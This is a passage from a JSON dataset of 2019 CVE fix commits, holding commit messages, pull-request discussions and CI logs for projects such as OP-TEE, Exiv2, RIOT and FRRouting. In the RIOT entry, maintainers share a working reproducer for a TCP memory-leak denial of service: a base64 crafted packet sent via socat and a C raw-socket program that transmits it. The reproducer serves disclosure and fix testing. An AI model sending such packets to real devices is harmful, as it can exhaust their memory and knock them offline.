            "other_info": "Fix out-of-bounds read in parse_char_class() \n[![Coverage Status](https://coveralls.io/builds/24926247/badge)](https://coveralls.io/builds/24926247)\n\nCoverage increased (+0.1%) to 80.904% when pulling **66dbbb428b7a4ca6a7563fc04c6b70dfa64361d1 on fix-139** into **ced209d5e980cd95f86edf680372dc5c91bc6837 on master**.",
            "pr_title_words": 5,
            "comments_words": 16,
            "total_other_info_words": 21
        },
        {
            "cve-id": "CVE-2019-25052",
            "commit_url": "https://github.com/OP-TEE/optee_os/commit/34a08bec755670ea0490cb53bbc68058cafc69b6",
            "commit_msg": "cryp: prevent direct calls to update and final functions\n\nWith inconsistent or malformed data it has been possible to call\n\"update\" and \"final\" crypto functions directly. Using a fuzzer tool [1]\nwe have seen that this results in asserts, i.e., a crash that\npotentially could leak sensitive information.\n\nBy setting the state (initialized) in the crypto context (i.e., the\ntee_cryp_state) at the end of all syscall_*_init functions and then add\na check of the state at the beginning of all update and final functions,\n  we prevent direct entrance to the \"update\" and \"final\" functions.\n\n[1] https://github.com/MartijnB/optee_fuzzer\n\nFixes: OP-TEE-2019-0021\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nReported-by: Martijn Bogaard <bogaard@riscure.com>\nAcked-by: Jerome Forissier <jerome.forissier@linaro.org>\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>",
            "commit_msg_words": 114,
            "other_info": "Riscure fuzzer vuln Squashed, rebased and tag(s) applied (should be) ready for merge! Thanks!",
            "pr_title_words": 3,
            "comments_words": 11,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2019-13108",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/206c357048bb52286313e3b042ddbfd528c3bcc8",
            "commit_msg": "Avoid negative integer overflow when `chunkLength == 0`.\n\nThis fixes #789.",
            "commit_msg_words": 11,
            "other_info": "Avoid negative integer overflow when chunkLength == 0 # [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/794?src=pr&el=h1) Report\n> Merging [#794](https://codecov.io/gh/Exiv2/exiv2/pull/794?src=pr&el=desc) into [0.27-maintenance](https://codecov.io/gh/Exiv2/exiv2/commit/f05d100579effd7459fd0715b26239d4cd2c9bcc?src=pr&el=desc) will **increase** coverage by `<.01%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/Exiv2/exiv2/pull/794/graphs/tree.svg?width=650&token=O9G7Iswx26&height=150&src=pr)](https://codecov.io/gh/Exiv2/exiv2/pull/794?src=pr&el=tree)\n\n```diff\n@@                 Coverage Diff                  @@\n##           0.27-maintenance     #794      +/-   ##\n====================================================\n+ Coverage             62.67%   62.68%   +<.01%     \n====================================================\n  Files                   156      156              \n  Lines                 21543    21545       +2     \n====================================================\n+ Hits                  13503    13505       +2     \n  Misses                 8040     8040\n```\n\n\n| [Impacted Files](https://codecov.io/gh/Exiv2/exiv2/pull/794?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/pngimage.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/794/diff?src=pr&el=tree#diff-c3JjL3BuZ2ltYWdlLmNwcA==) | `80.86% <100%> (+0.11%)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/794?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/794?src=pr&el=footer). Last update [f05d100...206c357](https://codecov.io/gh/Exiv2/exiv2/pull/794?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n @D4N: an alternative solution is disallow `chunkLength == 0` on [line 433](https://github.com/Exiv2/exiv2/pull/794/files#diff-3cdf312c2a771ea48fc0089e9d30d5e5R433). But I didn't do that because I wasn't sure if `chunkLength == 0` is invalid when `chunkType` is something different, like \"IEND\".\r\n\r\nWhy do you not want to throw an exception? Is it a performance thing? Thanks for the contribution! LGTM.\r\n\r\nWould you mind to rebase the branch in top `0.27-maintenance` ? @kevinbackhouse I've rebased the changes in your branch on top of `0.27-maintenance`. @piponazo @kevinbackhouse any objections to merging this?",
            "pr_title_words": 8,
            "comments_words": 199,
            "total_other_info_words": 207
        },
        {
            "cve-id": "CVE-2019-25028",
            "commit_url": "https://github.com/vaadin/framework/commit/c40bed109c3723b38694ed160ea647fef5b28593",
            "commit_msg": "Sanitize input used in Grid header",
            "commit_msg_words": 6,
            "other_info": "Sanitize caption used in Grid header",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-15134",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/c6df2064aff1ffb4015d4cedbaefb8850cb50aa8",
            "commit_msg": "gnrc_tcp: Fix memory leak",
            "commit_msg_words": 4,
            "other_info": "gnrc_tcp: Fix memory leak, potential DOS > \r\n> \r\n> `pkt` is released in each return path now, that looks right.\r\n\r\nHas this been tested/checked, e.g., with valgrind ?  > Has this been tested/checked, e.g., with valgrind ?\r\n\r\nThe fix has been tested with valgrind by myself, however, I am by no means familiar with the internals of `gnrc_tcp` and would thus prefer if someone else can confirm this as well.\r\n\r\n> `pkt` is released in each return path now, that looks right.\r\n\r\nDoes this mean that you can confirm the existence of the memory leak? Maybe @miri64 can give this a final look? @brummer-simon FYI I tried to reproduce the issue and failed. \r\n\r\nCould you please add more details on your tap device setup? > I tried to reproduce the issue and failed.\r\n\r\nCould you provide more details on what failed? If you enable debug in the corresponding files `gnrc_tcp_eventloop.c`, `gnrc_tcp.c`, `gnrc_tcp_fsm.c`, `gnrc_tcp_pkt.c`, \u2026 What output do you get? Does the packet get accepted or is it rejected early on? Did you make sure that RIOT uses the correct address (if it doesn't the packet gets rejected to early and doesn't reach the vulnerable code path)? Did you make sure that `gnrc_pktbuf_malloc` instead of `gnrc_pktbuf_static` is being used?\r\n\r\nI also believe that this is fairly obvious simply by looking at the code. Or to rephrase that: Where does gnrc_tcp release the pktbuf memory when no fitting tcb has been found? > \r\n> \r\n> > I tried to reproduce the issue and failed.\r\n> \r\n> Could you provide more details on what failed? If you enable debug in the corresponding files `gnrc_tcp_eventloop.c`, `gnrc_tcp.c`, `gnrc_tcp_fsm.c`, `gnrc_tcp_pkt.c`, \u2026 What output do you get? Does the packet get accepted or is it rejected early on? Did you make sure that RIOT uses the correct address (if it doesn't the packet gets rejected to early and doesn't reach the vulnerable code path)? Did you make sure that `gnrc_pktbuf_malloc` instead of `gnrc_pktbuf_static` is being used?\r\n> \r\n> I also believe that this is fairly obvious simply by looking at the code. Or to rephrase that: Where does gnrc_tcp release the pktbuf memory when no fitting tcb has been found?\r\n\r\nThe final step in the Error reproduction failed on my system:\r\n`echo rwsQf2pekYLaU+exUBBwgPDKAAA= | base64 -d | socat -u STDIN IP6-SENDTO:\r\n[fe80::e87d:b3ff:fe8b:4f02%tap0]:6`\r\n\r\nfailed because socat was not able to resolve [fe80::e87d:b3ff:fe8b:4f02%tap0], although tap0 had inet6 fe80::e87d:b3ff:fe8b:4f01/64 assigned to it. That might be tap-device setup related, I used \r\n`sudo ip tuntap add tap0 mode tap user ${USER}; sudo ip link set tap0 up` to create tap0.\r\n\r\nHow did you setup your Tap Device?\r\n\r\n> I also believe that this is fairly obvious simply by looking at the code. Or to rephrase that: Where does gnrc_tcp release the pktbuf memory when no fitting tcb has been found?\r\n\r\nI think the issue and the fix are obvious, but I still want to reproduce the Issue and test the fix. Again, thanks for finding it.\r\n\r\n\r\n \r\n\r\n > How did you setup your Tap Device?\r\n\r\n```\r\n# ip tuntap add tap0 mode tap\r\n# ip addr add fe80::e87d:b3ff:fe8b:4f01/64 dev tap0\r\n# ip link set tap0 up\r\n```\r\n\r\n*Though I believe that RIOT itself added that IP address to the interface.*\r\n\r\nMy `ip addr show dev tap0` output looks as follows:\r\n\r\n```\r\n7: tap0: <NO-CARRIER,BROADCAST,UP> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000\r\n    link/ether ea:7d:b3:8b:4f:01 brd ff:ff:ff:ff:ff:ff\r\n    inet6 fe80::e87d:b3ff:fe8b:4f01/64 scope link \r\n       valid_lft forever preferred_lft forever\r\n```\r\n\r\nWhat does your `ip addr show dev tap0` output look like?\r\n\r\n> socat was not able to resolve `[fe80::e87d:b3ff:fe8b:4f02%tap0]`,\r\n\r\nWhat's the exact socat output? Is your socat compiled with IPv6 support and support for raw IP sockets? Output of \"ip addr show dev tap0\":\r\n`3: tap0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\r\n    link/ether 6a:bf:db:05:c3:5e brd ff:ff:ff:ff:ff:ff\r\n    inet6 fe80::68bf:dbff:fe05:c35e/64 scope link \r\n       valid_lft forever preferred_lft forever\r\n    inet6 fe80::e87d:b3ff:fe8b:4f01/64 scope link \r\n       valid_lft forever preferred_lft forever`\r\n\r\nOutput of \"echo rwsQf2pekYLaU+exUBBwgPDKAAA= | base64 -d | socat -u STDIN IP6-SENDTO:[fe80::e87d:b3ff:fe8b:4f02%tap0]:6:\"\r\n\r\n`2019/08/19 13:34:00 socat[1462] E getaddrinfo(\"fe80::e87d:b3ff:fe8b:4f02%tap0\", \"NULL\", {5,10,2,6}, {}): ai_socktype not supported`\r\n\r\nThe output of socat -V is contains '#define WITH_IP6 1' and '#define WITH_RAWIP 1' so i assume everything required is supported by socat.\r\n > 2019/08/19 13:34:00 socat[1462] E getaddrinfo(\"fe80::e87d:b3ff:fe8b:4f02%tap0\", \"NULL\", {5,10,2,6}, {}): ai_socktype not supported\r\n\r\nThat's probably a bug in socat. See https://github.com/alpinelinux/aports/pull/10055 didn't think that this would also happen on non-musl-libc based systems. You can either apply the patch linked above to socat or try the following C program which sends the same packet (a bit hacky and not-well tested at all but should work):\r\n\r\n```C\r\n#include <err.h>\r\n#include <assert.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <stdlib.h>\r\n#include <netdb.h>\r\n\r\n#include <arpa/inet.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <sys/sendfile.h>\r\n\r\nstatic const uint8_t buffer[256] = {\r\n\t0xaf, 0x0b, 0x10, 0x7f, 0x6a, 0x5e, 0x91, 0x82, 0xda, 0x53,\r\n\t0xe7, 0xb1, 0x50, 0x10, 0x70, 0x80, 0xf0, 0xca, 0x00, 0x00,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n\t0xff, 0xff, 0xff, 0xff, 0xff, 0xff\r\n};\r\n\r\nint\r\nmain(void)\r\n{\r\n\tint fd, optval;\r\n\tstruct addrinfo hints, *srvinfo;\r\n\r\n\tif ((fd = socket(AF_INET6, SOCK_RAW, IPPROTO_TCP)) == -1)\r\n\t\terr(EXIT_FAILURE, \"socket failed\");\r\n\r\n\toptval = 1;\r\n\tif ((setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &optval,\r\n\t\t\tsizeof(optval)) == -1))\r\n\t\terr(EXIT_FAILURE, \"setsockopt failed\");\r\n\r\n\tmemset(&hints, 0, sizeof(struct addrinfo));\r\n\thints.ai_family = AF_INET6;\r\n\r\n\tif (getaddrinfo(\"fe80::e87d:b3ff:fe8b:4f02%tap0\", NULL, &hints, &srvinfo) != 0)\r\n\t\terr(EXIT_FAILURE, \"getaddrinfo failed\");\r\n\tassert(srvinfo != NULL);\r\n\r\n\tif (connect(fd, (struct sockaddr *)srvinfo->ai_addr, srvinfo->ai_addrlen) == -1)\r\n\t\terr(EXIT_FAILURE, \"connect failed\");\r\n\tif (write(fd, buffer, sizeof(buffer)) == -1)\r\n\t\terr(EXIT_FAILURE, \"write failed\");\r\n\r\n\treturn EXIT_SUCCESS;\r\n}\r\n``` Your C programm worked. Although a had to apply the fix from #11999 to get the expected Results.\r\n\r\n As I consider this a critical issue I requested a CVE for it. This request has been granted recently and this has been assigned [CVE-2019-15134](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15134). Well, it looks like fixed now. Any reason not to merge? > Well, it looks like fixed now. Any reason not to merge?\r\n\r\nNot from my side. But I don't have the rights to merge.\r\n Also needs a backport to the release branch. > \r\n> \r\n> Also needs a backport to the release branch.\r\n\r\n@MrKevinWeiss how about such backport? This is a security bug.\r\n Has this been backported yet? According to our normal procedures, we would expect a backport from @nmeum. In any case, @MrKevinWeiss is aware of the issue and will provide the backport otherwise. Ah ok, I will look into it then! @nmeum Many thanks!",
            "pr_title_words": 6,
            "comments_words": 1267,
            "total_other_info_words": 1273
        },
        {
            "cve-id": "CVE-2019-13445",
            "commit_url": "https://github.com/ros/ros_comm/commit/8f572f8648d3bab99283aa72fcdbf6bd71c86fa4",
            "commit_msg": "rosbag/record: fix signed int overflow",
            "commit_msg_words": 5,
            "other_info": "rosbag/record: fix potential signed int overflow @ros-pull-request-builder retest this please Looks like a safe change, thanks!",
            "pr_title_words": 6,
            "comments_words": 10,
            "total_other_info_words": 16
        },
        {
            "cve-id": "CVE-2019-7153",
            "commit_url": "https://github.com/WebAssembly/binaryen/commit/e63c4a7d04c145dafaf4b09de5f9f5de69cee8ef",
            "commit_msg": "More misc ASAN fixes (#1882)\n\n* fix buffer overflow in simple_ast.h printing.\r\n* check wasm binary format reading of function export indexes for errors.\r\n* check if s-expr format imports have a non-empty module and base.\r\n\r\nFixes #1876\r\nFixes #1877\r\nFixes #1879",
            "commit_msg_words": 42,
            "other_info": "More misc ASAN fixes Can be broken again!\r\n\"wasm-opt $POC\"\r\n\r\n[POC.zip](https://github.com/WebAssembly/binaryen/files/2790170/POC.zip)\r\n Thanks fix in #1887",
            "pr_title_words": 4,
            "comments_words": 11,
            "total_other_info_words": 15
        },
        {
            "cve-id": "CVE-2019-1010251",
            "commit_url": "https://github.com/OISF/suricata/commit/11f3659f64a4e42e90cb3c09fcef66894205aefe",
            "commit_msg": "teredo: be stricter on what to consider valid teredo\n\nInvalid Teredo can lead to valid DNS traffic (or other UDP traffic)\nbeing misdetected as Teredo. This leads to false negatives in the\nUDP payload inspection.\n\nMake the teredo code only consider a packet teredo if the encapsulated\ndata was decoded without any 'invalid' events being set.\n\nBug #2736.",
            "commit_msg_words": 58,
            "other_info": "Next/20181218/v8",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2019-5892",
            "commit_url": "https://github.com/FRRouting/frr/commit/943d595a018e69b550db08cccba1d0778a86705a",
            "commit_msg": "bgpd: don't use BGP_ATTR_VNC(255) unless ENABLE_BGP_VNC_ATTR is defined\n\nSigned-off-by: Lou Berger <lberger@labn.net>",
            "commit_msg_words": 12,
            "other_info": "bgpd: don't use BGP_ATTR_VNC(255) unless ENABLE_BGP_VNC_ATTR is defined Once this finishes CI I will push in. Please put these on all branches 3.0+ # Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/\n\nThis is a comment from an EXPERIMENTAL automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n## Get source and apply patch from patchwork: Successful\n\n## Building Stage: Successful\n\n## Basic Tests: Failed\n__CentOS 7 rpm pkg check: Successful__\n__Ubuntu 12.04 deb pkg check: Successful__\n__IPv6 protocols on Ubuntu 14.04: Successful__\n__Ubuntu 16.04 deb pkg check: Successful__\n__CentOS 6 rpm pkg check: Successful__\n__Ubuntu 14.04 deb pkg check: Successful__\n__IPv4 ldp protocol on Ubuntu 16.04: Successful__\n__Addresssanitizer topotest: Successful__\n__Debian 8 deb pkg check: Successful__\n__Fedora 24 rpm pkg check: Successful__\n__IPv4 protocols on Ubuntu 14.04: Successful__\n__Debian 9 deb pkg check: Successful__\n__Static analyzer (clang): Successful__\n\n\n#### Topology tests on Ubuntu 18.04 amd64: Failed\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-TOPOU1804-6327/test\n\n__Topology Tests failed for Topology tests on Ubuntu 18.04 amd64__:\n\n    *** defaultIntf: warning: r1 has no interfaces\n    2019-01-07 17:38:08,169 ERROR: ******************************************************************************\n    2019-01-07 17:38:08,170 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 17:38:08,170 ERROR: ******************************************************************************\n    2019-01-07 17:38:08,170 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 17:38:08,170 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 17:38:08,170 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 17:38:08,170 ERROR: FILE: scripts/check_close.py\n    2019-01-07 17:38:08,170 ERROR: 46   r3     Out of holddown +10.29 secs                              0    1\n    2019-01-07 17:38:08,170 ERROR: 47   r4     Out of holddown +10.51 secs                              0    1\n    2019-01-07 17:38:08,170 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/output.log for details of errors\n    2019-01-07 17:38:08,179 ERROR: assert failed at \"bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/test_check_close\": 2 tests failed\n    2019-01-07 17:39:55,239 ERROR: ******************************************************************************\n    2019-01-07 17:39:55,239 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 17:39:55,239 ERROR: ******************************************************************************\n    2019-01-07 17:39:55,239 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 17:39:55,239 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 17:39:55,240 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 17:39:55,240 ERROR: FILE: scripts/check_close.py\n    2019-01-07 17:39:55,240 ERROR: 46   r3     Out of holddown +10.26 secs                              0    1\n    2019-01-07 17:39:55,240 ERROR: 47   r4     Out of holddown +10.66 secs                              0    1\n    2019-01-07 17:39:55,240 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/output.log for details of errors\n    2019-01-07 17:39:55,242 ERROR: assert failed at \"bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/test_check_close\": 2 tests failed\n    *** defaultIntf: warning: lm has no interfaces\n\n   see full log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOU1804/ErrorLog/log_topotests.txt\n\n#### Topology tests on Ubuntu 16.04 amd64: Failed\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-TOPOU1604-6327/test\n\n__Topology Tests failed for Topology tests on Ubuntu 16.04 amd64__:\n\n    *** defaultIntf: warning: r1 has no interfaces\n    2019-01-07 09:37:37,780 ERROR: ******************************************************************************\n    2019-01-07 09:37:37,780 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 09:37:37,780 ERROR: ******************************************************************************\n    2019-01-07 09:37:37,780 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 09:37:37,781 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 09:37:37,781 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 09:37:37,781 ERROR: FILE: scripts/check_close.py\n    2019-01-07 09:37:37,781 ERROR: 46   r3     Out of holddown +10.22 secs                              0    1\n    2019-01-07 09:37:37,781 ERROR: 47   r4     Out of holddown +10.58 secs                              0    1\n    2019-01-07 09:37:37,781 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/output.log for details of errors\n    2019-01-07 09:37:38,232 ERROR: assert failed at \"bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/test_check_close\": 2 tests failed\n    2019-01-07 09:39:24,009 ERROR: ******************************************************************************\n    2019-01-07 09:39:24,009 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 09:39:24,009 ERROR: ******************************************************************************\n    2019-01-07 09:39:24,009 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 09:39:24,009 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 09:39:24,009 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 09:39:24,009 ERROR: FILE: scripts/check_close.py\n    2019-01-07 09:39:24,009 ERROR: 46   r3     Out of holddown +10.15 secs                              0    1\n    2019-01-07 09:39:24,010 ERROR: 47   r4     Out of holddown +10.22 secs                              0    1\n    2019-01-07 09:39:24,010 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/output.log for details of errors\n    2019-01-07 09:39:24,011 ERROR: assert failed at \"bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/test_check_close\": 2 tests failed\n    *** defaultIntf: warning: lm has no interfaces\n    2019-01-07 09:47:34,399 ERROR: 'compare_show_ipv6_ospf6' failed after 78.32 seconds\n    2019-01-07 09:47:37,541 ERROR: 'compare_show_ipv6_ospf6' failed after 3.14 seconds\n    2019-01-07 09:47:40,674 ERROR: 'compare_show_ipv6_ospf6' failed after 3.13 seconds\n    2019-01-07 09:47:40,676 ERROR: assert failed at \"test_ospf_topo1/test_ospf6_convergence\": OSPF6 did not converge on r1:\n      --- Current output\n      +++ Expected output\n      @@ -11,4 +11,3 @@\n        N E1 2001:db8:200::/64 fe80::xxxx:xxxx:xxxx:xxxx r1-eth1\n       *N IE 2001:db8:300::/64 fe80::xxxx:xxxx:xxxx:xxxx r1-eth1\n        N E1 2001:db8:300::/64 fe80::xxxx:xxxx:xxxx:xxxx r1-eth1\n      -*N E1 fe80::xxxx:xxxx:xxxx:xxxx fe80::xxxx:xxxx:xxxx:xxxx r1-eth1\n    assert False\n    2019-01-07 09:49:43,768 ERROR: 'compare_show_ipv6_ospf6' failed after 78.33 seconds\n    2019-01-07 09:49:43,770 ERROR: assert failed at \"test_ospf_topo1/test_ospf6_link_down\": OSPF6 did not converge on r3:\n      --- Current output\n      +++ Expected output\n      @@ -3,4 +3,3 @@\n        N E1 2001:db8:200::/64 fe80::xxxx:xxxx:xxxx:xxxx r3-eth2\n       *N IA 2001:db8:300::/64 fe80::xxxx:xxxx:xxxx:xxxx r3-eth2\n        N E1 2001:db8:300::/64 fe80::xxxx:xxxx:xxxx:xxxx r3-eth2\n      -*N E1 fe80::xxxx:xxxx:xxxx:xxxx fe80::xxxx:xxxx:xxxx:xxxx r3-eth2\n    assert False\n\n   see full log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOU1604/ErrorLog/log_topotests.txt\n\n#### Topotest tests on Ubuntu 16.04 i386: Failed\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-TOPOI386-6327/test\n\n__Topology Tests failed for Topotest tests on Ubuntu 16.04 i386__:\n\n    *** defaultIntf: warning: r1 has no interfaces\n    2019-01-07 09:38:20,989 ERROR: ******************************************************************************\n    2019-01-07 09:38:20,989 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 09:38:20,990 ERROR: ******************************************************************************\n    2019-01-07 09:38:20,990 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 09:38:20,990 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 09:38:20,990 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 09:38:20,990 ERROR: FILE: scripts/check_close.py\n    2019-01-07 09:38:20,990 ERROR: 46   r3     Out of holddown +10.60 secs                              0    1\n    2019-01-07 09:38:20,990 ERROR: 47   r4     Out of holddown +10.26 secs                              0    1\n    2019-01-07 09:38:20,990 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/output.log for details of errors\n    2019-01-07 09:38:20,993 ERROR: assert failed at \"bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/test_check_close\": 2 tests failed\n    2019-01-07 09:40:06,472 ERROR: ******************************************************************************\n    2019-01-07 09:40:06,473 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 09:40:06,473 ERROR: ******************************************************************************\n    2019-01-07 09:40:06,473 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 09:40:06,473 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 09:40:06,473 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 09:40:06,474 ERROR: FILE: scripts/check_close.py\n    2019-01-07 09:40:06,474 ERROR: 46   r3     Out of holddown +10.21 secs                              0    1\n    2019-01-07 09:40:06,474 ERROR: 47   r4     Out of holddown +10.03 secs                              0    1\n    2019-01-07 09:40:06,474 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/output.log for details of errors\n    2019-01-07 09:40:06,478 ERROR: assert failed at \"bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/test_check_close\": 2 tests failed\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    *** defaultIntf: warning: lm has no interfaces\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n\n   see full log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOI386/ErrorLog/log_topotests.txt\n\n__Topology Tests memory analysis:__ https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOU1804/MemoryLeaks/\n__Topology Tests memory analysis:__ https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOU1604/MemoryLeaks/\n__Topology Tests memory analysis:__ https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOI386/MemoryLeaks/\n-----------------------------\n## Warnings Generated during build:\n\n\n### Ubuntu 16.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 16.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/CI014BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Ubuntu 18.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 18.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/U1804AMD64/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 4 tags overridden (3 warnings, 1 info)\n\n\n### Ubuntu 16.04 i386 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 16.04 i386 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/U1604I386/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Debian 8 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Debian 8 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/CI008BLD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags 